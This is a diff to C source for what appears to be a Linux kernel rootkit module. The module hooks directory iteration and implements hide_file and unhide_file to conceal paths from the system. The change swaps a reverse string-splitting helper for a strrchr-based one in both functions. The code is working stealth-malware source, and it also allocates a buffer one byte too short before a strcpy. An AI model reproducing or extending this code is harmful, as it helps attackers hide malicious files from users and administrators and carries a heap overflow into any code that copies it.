@@ -284,16 +284,11 @@ static int new_iterate_shared(struct file *filp, struct dir_context *dir_context
 	return fops_hook->prev_fops->iterate_shared(filp, dir_context);
 }
 
-static char *strtok_r(char *str, const char *delim) {
-    int i = strlen(str) - 1;
-    while (str[i] != '\0') {
-        if (!memcmp(str + i, delim, sizeof(char) * strlen(delim))) {
-            str[i] = '\0';
-            return str + i + strlen(delim);
-        }
-        i--;
-    }
-    return NULL;
+static char *rsplit(char *str, const char delim) {
+    char *occurrence = strrchr(str, delim);
+    if (occurrence == NULL) return NULL;
+    *occurrence = '\0';
+    return occurrence + 1;
 }
 
 int hide_file(const char *path_name) {
@@ -306,7 +301,7 @@ int hide_file(const char *path_name) {
 
 	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
 	strcpy(dir_path, path_name);
-    file_name = strtok_r(dir_path, "/");
+    file_name = rsplit(dir_path, '/');
 
 	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
 	    return retval;
@@ -378,7 +373,7 @@ int unhide_file(const char *path_name) {
 
 	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
 	strcpy(dir_path, path_name);
-    file_name = strtok_r(dir_path, "/");
+    file_name = rsplit(dir_path, '/');
 
 	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
 	    return retval;
